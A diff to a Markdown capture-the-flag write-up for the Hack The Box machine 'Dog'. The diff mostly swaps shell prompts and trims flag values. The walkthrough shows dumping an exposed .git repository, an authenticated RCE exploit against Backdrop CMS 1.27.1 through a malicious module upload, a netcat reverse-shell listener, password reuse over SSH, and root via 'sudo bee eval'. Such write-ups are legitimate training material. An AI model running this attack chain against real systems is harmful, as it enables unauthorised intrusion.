@@ -13,7 +13,7 @@
 ## 🛰️ Ping Test
 
 ```bash
-n0tabdu11ah@MNM:~/CTF/HTB/Dog$ ping -c 4 10.10.11.58
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$ ping -c 4 -A  10.10.11.58
 PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
 64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=309 ms
 64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=242 ms
@@ -28,6 +28,7 @@ rtt min/avg/max/mdev = 240/263/309/32 ms
 ## 🔍 Reconnaissance
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 sudo nmap -sV -sC 10.10.11.58
 ```
 
@@ -60,6 +61,7 @@ Fuzzing reveals an exposed **.git** directory.
 Using GitDumper:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 ./gitdumper.sh http://10.10.11.58/.git/ extracted_repo
 ```
 
@@ -68,6 +70,7 @@ The repository is successfully downloaded.
 ### Dump Contents
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 ls extracted_repo
 core/ files/ index.php layouts/ LICENSE.txt README.md robots.txt settings.php sites/ themes/
 ```
@@ -79,6 +82,7 @@ core/ files/ index.php layouts/ LICENSE.txt README.md robots.txt settings.php si
 Searching inside the repository:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 grep -R "@dog" -n .
 ```
 
@@ -98,12 +102,14 @@ Backdrop CMS **1.27.1** is vulnerable to **Authenticated RCE** via malicious mod
 Exploit tool:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 python3 dog-rce.py http://10.10.11.58/
 ```
 
 This generates `shell.zip`. Backdrop does not allow ZIP uploads, so convert it:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 unzip shell.zip -d temp_dir
 tar -czf shell.tar.gz -C temp_dir .
 rm -rf temp_dir
@@ -120,6 +126,7 @@ http://10.10.11.58/?q=admin/modules/install
 Open listener:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 nc -lvnp 4444
 ```
 
@@ -138,12 +145,14 @@ We get **www-data** shell.
 Password reuse allows switching to user **johncusack**:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 ssh johncusack@10.10.11.58
 ```
 
 Retrieve user flag:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 cat ~/user.txt
 ```
 
@@ -154,6 +163,7 @@ cat ~/user.txt
 Check sudo permissions:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 sudo -l
 ```
 
@@ -168,6 +178,7 @@ User `johncusack` can run:
 Execute arbitrary system command:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 sudo bee eval 'system("/bin/bash");'
 ```
 
@@ -176,6 +187,7 @@ We now have a **root shell**.
 Retrieve root flag:
 
 ```bash
+thanatos@kali:/home/thanatos/Desktop/htb/machines/dog$
 cat /root/root.txt
 ```
 
@@ -200,10 +212,9 @@ cat /root/root.txt
 
 ## 🎯 Flags
 
-* **User:** ✔️ `1a0d************************`
-* **Root:** ✔️ `ac65************************`
+* **User:** ✔️ `1a0d...`
+* **Root:** ✔️ `ac65...`
 
 ---
 
-**Completed on:** 9 March, 2025
-🔥 *Another one in the bag — On to the next box!*
+
